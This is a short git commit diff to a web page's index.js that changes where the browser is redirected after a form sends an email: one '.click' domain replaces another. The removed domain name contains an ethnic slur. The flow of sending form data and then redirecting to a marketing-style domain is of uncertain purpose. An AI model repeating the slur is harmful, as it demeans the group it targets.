707226c74999396f96e712d69c060bdf98b12d14
husknet <127146284+husknet@users.noreply.github.com>
2024-10-07 06:26:32 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://mart.chinkslink.click';
+        window.location.href = 'https://sge.adagemarketing.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
